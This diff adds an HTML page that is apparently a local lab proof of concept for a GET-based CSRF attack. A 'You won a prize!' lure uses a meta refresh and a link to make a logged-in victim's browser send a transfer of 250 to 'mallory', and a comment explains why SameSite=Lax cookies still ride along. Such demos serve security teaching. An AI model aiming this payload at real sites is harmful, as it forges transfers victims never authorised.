@@ -1,0 +1,73 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>You won a prize!</title>
+  <!--
+    GET-based CSRF payload.
+
+    The victim is logged in at http://localhost:5000.
+    This page is served from http://127.0.0.1:5001, a different host.
+    The meta refresh is a top-level GET navigation, so a SameSite=Lax
+    session cookie is attached to the forged request. Strict is not.
+
+    Exact forged request:
+      GET /transfer?to=mallory&amount=250 HTTP/1.1
+      Host: localhost:5000
+      Cookie: <victim's session cookie, added by the browser>
+  -->
+  <meta http-equiv="refresh"
+        content="1;url=http://localhost:5000/transfer?to=mallory&amount=250">
+  <style>
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: grid;
+      place-items: center;
+      background: radial-gradient(circle at top, #312e81, #0f172a 70%);
+      color: #e2e8f0;
+      font-family: "Segoe UI", system-ui, sans-serif;
+    }
+    .box {
+      text-align: center;
+      background: #1e293b;
+      border: 1px solid #334155;
+      border-radius: 16px;
+      padding: 38px 44px;
+      max-width: 560px;
+      box-shadow: 0 25px 60px rgb(0 0 0 / 0.45);
+    }
+    h1 {
+      margin: 0 0 8px;
+      font-size: 2rem;
+    }
+    p {
+      color: #94a3b8;
+    }
+    code {
+      display: block;
+      margin: 18px 0;
+      padding: 10px;
+      background: #0b1220;
+      border: 1px solid #334155;
+      border-radius: 8px;
+      color: #7dd3fc;
+      font-family: Consolas, monospace;
+      font-size: 0.82rem;
+      overflow-wrap: anywhere;
+    }
+    a {
+      color: #38bdf8;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h1>You won a prize!</h1>
+    <p>Redirecting you to claim it&hellip;</p>
+    <code>GET http://localhost:5000/transfer?to=mallory&amp;amount=250</code>
+    <p>If nothing happens, <a href="http://localhost:5000/transfer?to=mallory&amp;amount=250">click here</a>.</p>
+  </div>
+</body>
+</html>
